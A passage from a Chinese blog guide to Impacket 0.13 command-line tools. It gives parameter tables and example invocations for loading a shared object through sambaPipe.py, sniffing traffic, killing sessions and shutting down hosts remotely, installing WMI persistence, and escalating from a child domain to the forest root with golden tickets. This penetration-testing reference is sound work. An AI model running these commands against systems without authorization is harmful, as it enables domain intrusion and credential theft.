+<td>用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）</td>
+</tr>
+</tbody></table>
+<p><strong>连接参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-dc-ip ip address</code></td>
+<td>域控制器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-target-ip ip address</code></td>
+<td>目标机器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-port [destination port]</code></td>
+<td>连接到 SMB 服务器的目标端口</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sambaPipe.py -so exploit.so domain/username:password@target_ip</span><br><span class="line">python sambaPipe.py -so exploit.so -debug domain/username:password@target_ip</span><br></pre></td></tr></table></figure>
+
+<h2 id="监控和嗅探工具"><a href="#监控和嗅探工具" class="headerlink" title="监控和嗅探工具"></a>监控和嗅探工具</h2><h3 id="sniff-py"><a href="#sniff-py" class="headerlink" title="sniff.py"></a>sniff.py</h3><p><strong>功能</strong>: 网络嗅探工具<br><strong>用途</strong>: 捕获和分析网络流量</p>
+<p><strong>注意事项</strong>:</p>
+<ul>
+<li><strong>依赖要求</strong>: 需要安装 <code>pcapy</code> 模块</li>
+<li><strong>权限要求</strong>: 需要管理员权限才能打开原始套接字</li>
+</ul>
+<p><strong>参数说明</strong>:</p>
+<p>该脚本接受 BPF (Berkeley Packet Filter) 过滤器作为参数，默认为空（匹配所有数据包）。</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>[filter]</code></td>
+<td>BPF 过滤器表达式（可选），用于过滤捕获的数据包</td>
+</tr>
+</tbody></table>
+<p><strong>使用前需要先安装依赖</strong>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pcapy</span><br></pre></td></tr></table></figure>
+
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 捕获所有数据包</span></span><br><span class="line">python sniff.py</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只捕获 TCP 流量</span></span><br><span class="line">python sniff.py tcp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只捕获特定端口的流量</span></span><br><span class="line">python sniff.py <span class="string">&quot;tcp port 80&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 只捕获特定主机的流量</span></span><br><span class="line">python sniff.py <span class="string">&quot;host 192.168.1.100&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 组合过滤器</span></span><br><span class="line">python sniff.py <span class="string">&quot;tcp port 80 and host 192.168.1.100&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="sniffer-py"><a href="#sniffer-py" class="headerlink" title="sniffer.py"></a>sniffer.py</h3><p><strong>功能</strong>: 网络数据包嗅探工具<br><strong>用途</strong>: 使用原始套接字监听指定协议的网络数据包</p>
+<p><strong>注意事项</strong>:</p>
+<ul>
+<li><strong>权限要求</strong>: 需要管理员权限才能创建原始套接字</li>
+<li><strong>平台限制</strong>: 在 Windows 上需要以管理员身份运行</li>
+</ul>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>[protocol1] [protocol2] ...</code></td>
+<td>要监听的协议名称（可选），默认为 <code>icmp</code>, <code>tcp</code>, <code>udp</code></td>
+</tr>
+</tbody></table>
+<p><strong>支持的协议</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>icmp</code></td>
+<td>ICMP 协议</td>
+</tr>
+<tr>
+<td><code>tcp</code></td>
+<td>TCP 协议</td>
+</tr>
+<tr>
+<td><code>udp</code></td>
+<td>UDP 协议</td>
+</tr>
+<tr>
+<td>其他</td>
+<td>系统支持的其他协议名称</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用默认协议 (icmp, tcp, udp)</span></span><br><span class="line">python sniffer.py</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只监听 ICMP 流量</span></span><br><span class="line">python sniffer.py icmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 监听 TCP 和 UDP 流量</span></span><br><span class="line">python sniffer.py tcp udp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 监听多种协议</span></span><br><span class="line">python sniffer.py icmp tcp udp</span><br></pre></td></tr></table></figure>
+
+<h3 id="ping-py"><a href="#ping-py" class="headerlink" title="ping.py"></a>ping.py</h3><p><strong>功能</strong>: 网络连通性测试<br><strong>用途</strong>: 测试网络连通性</p>
+<p><strong>权限要求</strong>:</p>
+<ul>
+<li>需要管理员权限才能打开原始套接字</li>
+</ul>
+<p><strong>参数说明</strong>:<br>该脚本没有使用参数解析器，直接接受两个位置参数：</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&lt;src ip&gt;</code></td>
+<td>源 IP 地址</td>
+</tr>
+<tr>
+<td><code>&lt;dst ip&gt;</code></td>
+<td>目标 IP 地址</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ping.py <span class="number">192.168</span><span class="number">.1</span><span class="number">.100</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.200</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="ping6-py"><a href="#ping6-py" class="headerlink" title="ping6.py"></a>ping6.py</h3><p><strong>功能</strong>: IPv6 网络连通性测试<br><strong>用途</strong>: 测试 IPv6 网络连通性</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&lt;src ip&gt;</code></td>
+<td>源 IPv6 地址</td>
+</tr>
+<tr>
+<td><code>&lt;dst ip&gt;</code></td>
+<td>目标 IPv6 地址</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ping6.py <span class="number">2001</span>:0db8:85a3:<span class="number">0000</span>:<span class="number">0000</span>:8a2e:0370:<span class="number">7334</span> <span class="number">2001</span>:0db8:85a3:<span class="number">0000</span>:<span class="number">0000</span>:8a2e:0370:<span class="number">7335</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="辅助工具"><a href="#辅助工具" class="headerlink" title="辅助工具"></a>辅助工具</h2><h3 id="split-py"><a href="#split-py" class="headerlink" title="split.py"></a>split.py</h3><p><strong>功能</strong>: 文件分割工具<br><strong>用途</strong>: 将大文件分割成多个小文件<br><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python split.py file.txt <span class="number">1000000</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="tstool-py"><a href="#tstool-py" class="headerlink" title="tstool.py"></a>tstool.py</h3><p><strong>功能</strong>: 终端服务工具<br><strong>用途</strong>: 终端服务操作工具</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>target</code></td>
+<td>目标系统，格式为 <code>[[domain/]username[:password]@]&lt;targetName or address&gt;</code></td>
+</tr>
+<tr>
+<td><code>qwinsta</code></td>
+<td>显示远程桌面服务会话信息</td>
+</tr>
+<tr>
+<td><code>tasklist</code></td>
+<td>显示系统上当前运行的进程列表</td>
+</tr>
+<tr>
+<td><code>taskkill</code></td>
+<td>通过进程 ID (PID) 或图像名称终止任务</td>
+</tr>
+<tr>
+<td><code>tscon</code></td>
+<td>将用户会话附加到远程桌面会话</td>
+</tr>
+<tr>
+<td><code>tsdiscon</code></td>
+<td>断开远程桌面服务会话</td>
+</tr>
+<tr>
+<td><code>logoff</code></td>
+<td>注销远程桌面服务会话</td>
+</tr>
+<tr>
+<td><code>shutdown</code></td>
+<td>远程关机（影响所有会话和登录用户）</td>
+</tr>
+<tr>
+<td><code>msg</code></td>
+<td>向远程桌面服务会话发送消息（MSGBOX）</td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+<tr>
+<td><code>-no-pass</code></td>
+<td>不询问密码（对 -k 有用）</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>使用 Kerberos 身份验证</td>
+</tr>
+<tr>
+<td><code>-aesKey hex key</code></td>
+<td>用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）</td>
+</tr>
+</tbody></table>
+<p><strong>连接参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-dc-ip ip address</code></td>
+<td>域控制器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-target-ip ip address</code></td>
+<td>目标机器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-port [destination port]</code></td>
+<td>连接到 SMB 服务器的目标端口</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python tstool.py domain/username:password@target_ip qwinsta</span><br><span class="line">python tstool.py domain/username:password@target_ip tasklist</span><br><span class="line">python tstool.py domain/username:password@target_ip taskkill -pid <span class="number">1234</span></span><br><span class="line">python tstool.py domain/username:password@target_ip shutdown</span><br></pre></td></tr></table></figure>
+
+<h3 id="wmipersist-py"><a href="#wmipersist-py" class="headerlink" title="wmipersist.py"></a>wmipersist.py</h3><p><strong>功能</strong>: WMI 持久化工具<br><strong>用途</strong>: 创建&#x2F;删除 WMI 事件使用者&#x2F;过滤器，并在两者之间建立链接，基于指定的 WQL 过滤器或计时器执行 Visual Basic</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>target</code></td>
+<td>目标系统，格式为 &#96;[domain&#x2F;]username[:password]@]&lt;address</td>
+</tr>
+<tr>
+<td>install</td>
+<td><code>install</code>: 安装 wmi 事件使用者&#x2F;过滤器</td>
+</tr>
+<tr>
+<td>remove</td>
+<td><code>remove</code>: 删除 wmi 事件使用者&#x2F;过滤器</td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+<tr>
+<td><code>-com-version MAJOR_VERSION:MINOR_VERSION</code></td>
+<td>DCOM 版本，格式为 MAJOR_VERSION:MINOR_VERSION</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+<tr>
+<td><code>-no-pass</code></td>
+<td>不询问密码（对 -k 有用）</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>使用 Kerberos 身份验证</td>
+</tr>
+<tr>
+<td><code>-aesKey hex key</code></td>
+<td>用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）</td>
+</tr>
+<tr>
+<td><code>-dc-ip ip address</code></td>
+<td>域控制器的 IP 地址</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python wmipersist.py domain/username:password@target_ip install</span><br><span class="line">python wmipersist.py domain/username:password@target_ip remove</span><br><span class="line">python wmipersist.py -com-version <span class="number">5.7</span> domain/username:password@target_ip install</span><br></pre></td></tr></table></figure>
+
+<h3 id="wmiquery-py"><a href="#wmiquery-py" class="headerlink" title="wmiquery.py"></a>wmiquery.py</h3><p><strong>功能</strong>: WMI 查询工具<br><strong>用途</strong>: 使用 Windows 管理工具执行 WQL 查询并获取对象描述</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>target</code></td>
+<td>目标系统，格式为 <code>[[domain/]username[:password]@]&lt;targetName or address&gt;</code></td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-namespace NAMESPACE</code></td>
+<td>命名空间名称（默认 &#x2F;&#x2F;.&#x2F;root&#x2F;cimv2）</td>
+</tr>
+<tr>
+<td><code>-file FILE</code></td>
+<td>包含要在 WQL shell 中执行的命令的输入文件</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+<tr>
+<td><code>-com-version MAJOR_VERSION:MINOR_VERSION</code></td>
+<td>DCOM 版本，格式为 MAJOR_VERSION:MINOR_VERSION，例如 5.7</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+<tr>
+<td><code>-no-pass</code></td>
+<td>不询问密码（对 -k 有用）</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>使用 Kerberos 身份验证</td>
+</tr>
+<tr>
+<td><code>-aesKey hex key</code></td>
+<td>用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）</td>
+</tr>
+<tr>
+<td><code>-dc-ip ip address</code></td>
+<td>域控制器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-rpc-auth-level [{integrity,privacy,default}]</code></td>
+<td>默认、完整性（RPC_C_AUTHN_LEVEL_PKT_INTEGRITY）或隐私（RPC_C_AUTHN_LEVEL_PKT_PRIVACY）</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python wmiquery.py domain/username:password@target_ip</span><br><span class="line">python wmiquery.py -namespace //./root/cimv2 domain/username:password@target_ip</span><br><span class="line">python wmiquery.py -file queries.wql domain/username:password@target_ip</span><br></pre></td></tr></table></figure>
+
+<h3 id="raiseChild-py"><a href="#raiseChild-py" class="headerlink" title="raiseChild.py"></a>raiseChild.py</h3><p><strong>功能</strong>: 子域提权工具<br><strong>用途</strong>: 从子域提权到森林根域</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>target</code></td>
+<td>domain&#x2F;username[:password]</td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+<tr>
+<td><code>-w pathname</code></td>
+<td>将黄金票据以 CCache 格式写入指定文件</td>
+</tr>
+<tr>
+<td><code>-target-exec target address</code></td>
+<td>主攻击完成后要执行 PSEXEC 的目标主机</td>
+</tr>
+<tr>
+<td><code>-targetRID RID</code></td>
+<td>要转储凭据的目标用户 RID，默认为 Administrator (500)</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+<tr>
+<td><code>-no-pass</code></td>
+<td>不询问密码（对 -k 有用）</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>使用 Kerberos 身份验证，从 ccache 文件（KRB5CCNAME）获取凭据</td>
+</tr>
+<tr>
+<td><code>-aesKey hex key</code></td>
+<td>用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python raiseChild.py domain/username:password</span><br><span class="line">python raiseChild.py -w golden.ccache domain/username:password</span><br><span class="line">python raiseChild.py -target-<span class="built_in">exec</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.100</span> domain/username:password</span><br><span class="line">python raiseChild.py -targetRID <span class="number">1104</span> domain/username:password</span><br></pre></td></tr></table></figure>
+
+<h2 id="使用注意事项"><a href="#使用注意事项" class="headerlink" title="使用注意事项"></a>使用注意事项</h2><ol>
+<li><strong>权限要求</strong>: 部分工具是需要管理员或域管的权限的</li>
+<li><strong>网络环境</strong>: 确保目标系统可访问，防火墙允许相关端口</li>
+<li><strong>版本兼容性</strong>: Impacket 0.13 版本是跟之前的一些py脚本命令是有出入的。如果你使用0.13版本就尽可能参考我这边翻译转化而来的</li>
+<li><strong>依赖安装</strong>: 确保已安装所有必要的依赖库，kali内置了impacket的依赖库，必要的时候最好使用venv虚拟环境，不然环境很容易混</li>
+</ol>
+<h2 id="常见问题排查"><a href="#常见问题排查" class="headerlink" title="常见问题排查"></a>常见问题排查</h2><ul>
+<li><p><strong>连接失败</strong>: 检查网络连通性、防火墙设置、凭据是否正确</p>
+</li>
+<li><p><strong>权限不足</strong>: 确认使用的账户具有足够权限</p>
+</li>
+</ul>
+
+    </article>
+    <!-- license -->
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://wenfenhui.github.io">wenfenhui</a>
+            <p>原文链接：<a href="https://wenfenhui.github.io/2026/04/08/impacket0.13wiki%E6%8C%87%E5%8D%97/">https://wenfenhui.github.io/2026/04/08/impacket0.13wiki%E6%8C%87%E5%8D%97/</a>
+            <p>发表日期：<a href="https://wenfenhui.github.io/2026/04/08/impacket0.13wiki%E6%8C%87%E5%8D%97/">April 8th 2026, 4:00:00 am</a>
+            <p>更新日期：<a href="https://wenfenhui.github.io/2026/04/08/impacket0.13wiki%E6%8C%87%E5%8D%97/">April 8th 2026, 4:02:14 pm</a>
+            <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2026/04/08/bloodyAD%E4%B8%AD%E6%96%87%E6%8C%87%E5%8D%97/" title="bloodyAD 中文指南">
+                    <div class="nextTitle">bloodyAD 中文指南</div>
+                </a>
+        </li>
+        <li class="previous">
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2026/04/07/Certipy%E4%B8%AD%E6%96%87%E6%96%87%E6%A1%A3/" title="Certipy 中文文档">
+                    <div class="prevTitle">Certipy 中文文档</div>
+                </a>
+        </li>
+    </ul>
+    <!-- comment -->
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+            
+            
+            
+            <!-- utteranc评论 -->
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+            
+            
+            
+        </div>
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    <!-- Mathjax -->
+</main>
+
+                <!-- profile -->
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+        <div class="social">
+                            <a href="//github.com/wenfenhui" class="iconfont-archer github" target="_blank" title="github"></a>
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title="rss"></a>
+
+        </div>
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    <!-- 不蒜子  -->
+        <div class="busuanzi-container">
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+        </div>
+</footer>
+
+        </div>
+        <!-- toc -->
+            <div class="toc-wrapper toc-wrapper-loding" style=    top:50vh;
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Impacket-wiki%E4%B8%AD%E6%96%87%E6%8C%87%E5%8D%97"><span class="toc-number">1.</span> <span class="toc-text">Impacket wiki中文指南</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E5%B7%A5%E5%85%B7"><span class="toc-number">1.1.</span> <span class="toc-text">远程执行工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#psexec-py"><span class="toc-number">1.1.1.</span> <span class="toc-text">psexec.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wmiexec-py"><span class="toc-number">1.1.2.</span> <span class="toc-text">wmiexec.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#smbexec-py"><span class="toc-number">1.1.3.</span> <span class="toc-text">smbexec.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dcomexec-py"><span class="toc-number">1.1.4.</span> <span class="toc-text">dcomexec.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#atexec-py"><span class="toc-number">1.1.5.</span> <span class="toc-text">atexec.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7"><span class="toc-number">1.2.</span> <span class="toc-text">域信息收集工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GetADUsers-py"><span class="toc-number">1.2.1.</span> <span class="toc-text">GetADUsers.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GetADComputers-py"><span class="toc-number">1.2.2.</span> <span class="toc-text">GetADComputers.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GetUserSPNs-py"><span class="toc-number">1.2.3.</span> <span class="toc-text">GetUserSPNs.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GetNPUsers-py"><span class="toc-number">1.2.4.</span> <span class="toc-text">GetNPUsers.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lookupsid-py"><span class="toc-number">1.2.5.</span> <span class="toc-text">lookupsid.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#findDelegation-py"><span class="toc-number">1.2.6.</span> <span class="toc-text">findDelegation.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#machine-role-py"><span class="toc-number">1.2.7.</span> <span class="toc-text">machine_role.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#netview-py"><span class="toc-number">1.2.8.</span> <span class="toc-text">netview.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#net-py"><span class="toc-number">1.2.9.</span> <span class="toc-text">net.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%AD%E8%AF%81%E6%8F%90%E5%8F%96%E5%B7%A5%E5%85%B7"><span class="toc-number">1.3.</span> <span class="toc-text">凭证提取工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#secretsdump-py"><span class="toc-number">1.3.1.</span> <span class="toc-text">secretsdump.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#samrdump-py"><span class="toc-number">1.3.2.</span> <span class="toc-text">samrdump.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#samedit-py"><span class="toc-number">1.3.3.</span> <span class="toc-text">samedit.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mimikatz-py"><span class="toc-number">1.3.4.</span> <span class="toc-text">mimikatz.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DumpNTLMInfo-py"><span class="toc-number">1.3.5.</span> <span class="toc-text">DumpNTLMInfo.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Get-GPPPassword-py"><span class="toc-number">1.3.6.</span> <span class="toc-text">Get-GPPPassword.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GetLAPSPassword-py"><span class="toc-number">1.3.7.</span> <span class="toc-text">GetLAPSPassword.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E5%B7%A5%E5%85%B7"><span class="toc-number">1.4.</span> <span class="toc-text">网络工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#smbclient-py"><span class="toc-number">1.4.1.</span> <span class="toc-text">smbclient.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#smbserver-py"><span class="toc-number">1.4.2.</span> <span class="toc-text">smbserver.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rpcdump-py"><span class="toc-number">1.4.3.</span> <span class="toc-text">rpcdump.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rpcmap-py"><span class="toc-number">1.4.4.</span> <span class="toc-text">rpcmap.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CheckLDAPStatus-py"><span class="toc-number">1.4.5.</span> <span class="toc-text">CheckLDAPStatus.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mssqlclient-py"><span class="toc-number">1.4.6.</span> <span class="toc-text">mssqlclient.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mssqlinstance-py"><span class="toc-number">1.4.7.</span> <span class="toc-text">mssqlinstance.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rdp-check-py"><span class="toc-number">1.4.8.</span> <span class="toc-text">rdp_check.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7"><span class="toc-number">1.5.</span> <span class="toc-text">系统管理工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#services-py"><span class="toc-number">1.5.1.</span> <span class="toc-text">services.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#registry-read-py"><span class="toc-number">1.5.2.</span> <span class="toc-text">registry-read.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#reg-py"><span class="toc-number">1.5.3.</span> <span class="toc-text">reg.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#regsecrets-py"><span class="toc-number">1.5.4.</span> <span class="toc-text">regsecrets.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 